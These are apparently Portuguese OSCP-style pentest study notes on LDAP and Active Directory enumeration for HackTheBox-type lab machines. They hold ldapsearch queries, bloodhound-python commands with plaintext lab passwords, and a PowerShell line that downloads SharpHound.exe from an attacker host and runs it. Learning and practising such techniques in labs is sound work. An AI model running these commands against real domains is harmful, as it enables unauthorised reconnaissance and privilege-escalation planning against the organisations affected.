# LDAP

Após a fase de enumeração, que pode ser encontrada [aqui](Infraestrutura/OSCP%20Enumeration.md#LDAP), podemos prosseguir com os demais comandos, tais como:

```
ldapsearch -x -H ldap://<hostname> -b "DC=streamio,DC=htb" "*"

ldapsearch -H ldap://10.10.11.158:3268/ -x -s base -b '' "(objectClass=*)" "*"
```

Com credencial

```
ldapsearch -x -H ldap://10.129.210.134 -D "yoshihide@streamio.htb" -W -b "dc=streamio,dc=htb" "(objectclass=group)"
```

Command options explained:

\-x use simple authentication (as opposed to SASL) -H your AD server -D the DN to bind to the directory. In other words, the user you are authenticating with. -W Prompt for the password. The password should match what is in your directory for the the bindn (-D). Mutually exclusive from -w. -b The starting point for the search

## Enumeracao Usuarios

## Enumeracao (com credenciais)

Para facilitar a enumeração via ldap, podemos utilizar o bloodhound. Visto que é provável que todas as demais enumerações sejam possíveis por ldapsearch também, porém, os comandos e o protocolo detém uma complexidade um pouco maior. Deixaremos essa pesquisa para o futuro. Focando no bloodhound no momento, vamos considerar algumas opções de enumeração.

**Remotamente**

```
bloodhound-python -u administrator -p Ignite@987 -ns 192.168.1.172 -d ignite.local -c All
```
    
    #Outro exemplo

```
bloodhound-python -u mhope -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -v --zip -c All -dc MEGABANK.LOCAL -ns 10.10.10.172
```

**Localmente**

```
(new-object net.webclient).downloadfile('http://10.10.14.17/SharpHound.exe', 'c:\temp\sh.exe')
.\sh.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
```

Aqui devemos levar em conta algumas coisas na hora de analisar. As ACLs e as permissões que nossos usuários possuem no domínio. Isto pode ser visto por meio do bloodhound da seguinte maneira:

![qownnotes-media-aLRwyW](../.gitbook/assets/qownnotes-media-aLRwyW.png)

Além de verificar os caminhos pré montados qque já fazemos:

![qownnotes-media-GzmGRm](../.gitbook/assets/qownnotes-media-GzmGRm.png)

Outra opção para ser observado seria:

![qownnotes-media-LVuEYt](../.gitbook/assets/qownnotes-media-LVuEYt.png)

Ao clicar com o botão direito no objeto, temos de procurar caminhos mais curtos para chegar neste ponto. Dessa forma, não deixamos passar nenhuma análise por meio do bloodhound.